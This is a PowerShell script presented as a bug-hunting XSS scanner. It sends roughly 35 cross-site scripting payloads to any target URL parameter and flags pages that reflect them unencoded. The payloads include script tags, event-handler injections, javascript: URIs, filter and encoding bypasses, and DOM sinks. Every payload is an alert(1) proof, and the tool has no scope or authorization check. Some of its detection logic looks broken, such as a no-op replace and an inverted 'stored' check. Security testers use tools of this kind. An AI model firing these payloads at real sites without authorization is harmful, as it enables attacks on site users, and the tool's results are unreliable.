# Bug Hunter - XSS Testing Tool
# Usage: ./test-xss.ps1 -Target <url> -Param <param>

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,
    [string]$Param = "q",
    [switch]$All,
    [switch]$Stored,
    [switch]$DOM,
    [switch]$Reflected
)

Write-Host "[*] XSS Testing for: $Target" -ForegroundColor Cyan

$results = @()

# XSS Payloads - various categories
$xssPayloads = @{
    # Basic payloads
    "<script>alert(1)</script>" = "Basic script"
    "<img src=x onerror=alert(1)>" = "Img error"
    "<svg onload=alert(1)>" = "SVG onload"
    "<iframe src=javascript:alert(1)>" = "Iframe javascript"
    
    # Event handlers
    "<body onload=alert(1)>" = "Body onload"
    "<input onfocus=alert(1) autofocus>" = "Input autofocus"
    "<select onfocus=alert(1) autofocus>" = "Select autofocus"
    "<textarea onfocus=alert(1) autofocus>" = "Textarea autofocus"
    "<keygen onfocus=alert(1) autofocus>" = "Keygen autofocus"
    "<video><source onerror=\"alert(1)\">" = "Video error"
    "<audio src=x onerror=alert(1)>" = "Audio error"
    "<details open ontoggle=alert(1)>" = "Details ontoggle"
    "<marquee onstart=alert(1)>" = "Marquee onstart"
    "<animation onanimationstart=alert(1)>" = "Animation start"
    
    # JavaScript URI
    "javascript:alert(1)" = "javascript URI"
    "javascript:alert(1)//" = "javascript URI comment"
    "<a href=javascript:alert(1)>x</a>" = "Anchor href"
    
    # Filter bypass
    "<img src=\"x:alert(1)\">" = "img src"
    "<svg><a href=\"javascript:alert(1)\"><text y=\"1\" x=\"1\">x</text></a></svg>" = "SVG anchor"
    "<div/draggable=\"true\" ondragstart=\"alert(1)\">x</div>" = "Div draggable"
    
    # Encoding bypass
    "<scr_ipt>alert(1)</scr_ipt>" = "Underscore bypass"
    "<ScRiPt>alert(1)</sCrIpT>" = "Case bypass"
    "<script\x>alert(1)</script>" = "Null byte"
    "%3Cscript%3Ealert(1)%3C/script%3E" = "URL encoding"
    
    # Quote bypass
    "'-alert(1)-'" = "Quote bypass"
    "\"-alert(1)-\"" = "Double quote"
    ";alert(1);//" = "Semicolon"
    
    # Unicode bypass
    "&#60;script&#62;alert(1)&#60;/script&#62;" = "HTML entity"
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;" = "Hex entity"
    
    # DOM XSS sinks
    "location=javascript:alert(1)" = "location"
    "location.href=javascript:alert(1)" = "location.href"
    "eval('alert(1)')" = "eval"
    "setTimeout('alert(1)')" = "setTimeout"
}

function Test-XSS {
    param($payload, $description)
    
    Write-Host "[*] Testing: $description" -ForegroundColor Gray
    
    try {
        # Build URL with payload
        $separator = if ($Target -match "\?") { "&" } else { "?" }
        $testUrl = "$Target$separator$Param=$([System.Uri]::EscapeDataString($payload))"
        
        $response = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -ErrorAction SilentlyContinue
        
        # Check if payload is reflected without encoding
        if ($response.Content -match [System.Text.RegularExpressions.Regex]::Escape($payload -replace "<script>", "<script>")) {
            Write-Host "[!] XSS FOUND (Reflected): $description" -ForegroundColor Red
            return @{Payload=$payload; Description=$description; Type="Reflected"}
        }
        
        # Check for basic script tags
        if ($payload -match "<script" -and $response.Content -match "<script") {
            # Check if not sanitized
            if ($response.Content -notmatch "<script[^>]*>[\s\S]*?</script>") {
                Write-Host "[!] XSS FOUND: $description" -ForegroundColor Red
                return @{Payload=$payload; Description=$description; Type="Stored"}
            }
        }
        
    } catch {
        Write-Host "[*] Error testing: $description" -ForegroundColor Yellow
    }
    
    return $null
}

# Run tests
if ($All -or -not $Stored -and -not $DOM -and -not $Reflected) {
    Write-Host "[*] Running full XSS tests..." -ForegroundColor Yellow
    
    foreach ($payload in $xssPayloads.GetEnumerator()) {
        $result = Test-XSS -payload $payload.Key -description $payload.Value
        if ($result) { $results += $result }
    }
}

if ($Stored) {
    Write-Host "[*] Testing for stored XSS..." -ForegroundColor Yellow
    # Stored XSS requires multiple requests - need to check after submission
    Write-Host "[!] Stored XSS requires checking after form submission" -ForegroundColor Yellow
}

if ($DOM) {
    Write-Host "[*] Testing for DOM XSS..." -ForegroundColor Yellow
    # DOM XSS requires browser automation or manual inspection
    $domPayloads = @("javascript:alert(1)", "location=alert(1)", "eval(alert(1))")
    foreach ($payload in $domPayloads) {
        Test-XSS -payload $payload -description "DOM: $payload"
    }
}

# Output results
Write-Host "`n[*] XSS Testing Complete" -ForegroundColor Green
Write-Host "[*] Found $($results.Count) potential XSS vulnerabilities" -ForegroundColor Cyan

foreach ($result in $results) {
    Write-Host "  - $($result.Description): $($result.Payload)" -ForegroundColor White
}

# Save results
$resultsFile = "./bug-hunter-output/xss-results.txt"
if (!(Test-Path "./bug-hunter-output")) {
    New-Item -ItemType Directory -Path "./bug-hunter-output" -Force | Out-Null
}

$results | ConvertTo-Json | Set-Content $resultsFile
Write-Host "[*] Results saved to: $resultsFile" -ForegroundColor Green